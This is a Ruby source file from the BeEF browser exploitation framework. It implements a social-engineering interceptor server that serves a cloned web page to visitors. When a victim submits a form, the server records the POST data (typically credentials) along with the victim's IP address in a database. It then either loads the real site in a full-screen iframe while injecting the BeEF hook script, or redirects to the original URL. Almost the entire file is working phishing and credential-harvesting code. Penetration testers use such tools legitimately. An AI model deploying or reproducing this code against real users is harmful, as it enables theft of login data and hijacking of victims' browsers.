#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module SocialEngineering
      require 'sinatra/base'
      class Interceptor < Sinatra::Base

      configure do
          set :show_exceptions, false
      end

      # intercept GET
      get "/" do
        print_info "GET request from IP #{request.ip}"
        print_info "Referer: #{request.referer}"
        cloned_page = settings.cloned_page
        cloned_page
      end

      # intercept POST
      post "/" do
        print_info "POST request from IP #{request.ip}"
        request.body.rewind
        data = request.body.read
        print_info "Intercepted data:"
        print_info data

        interceptor_db = BeEF::Core::Models::Interceptor.new(
            :webcloner_id => settings.db_entry.id,
            :post_data => data,
            :ip => request.ip
        )
        interceptor_db.save

        if settings.frameable
          print_info "Page can be framed :-) Loading original URL into iFrame..."
          "<html><head><script type=\"text/javascript\" src=\"#{settings.beef_hook}\"></script>\n</head></head><body><iframe src=\"#{settings.redirect_to}\" style=\"border:none; background-color:white; width:100%; height:100%; position:absolute; top:0px; left:0px; padding:0px; margin:0px\"></iframe></body></html>"
        else
          print_info "Page can not be framed :-) Redirecting to original URL..."
          redirect settings.redirect_to
        end
      end
      end
    end
  end
end

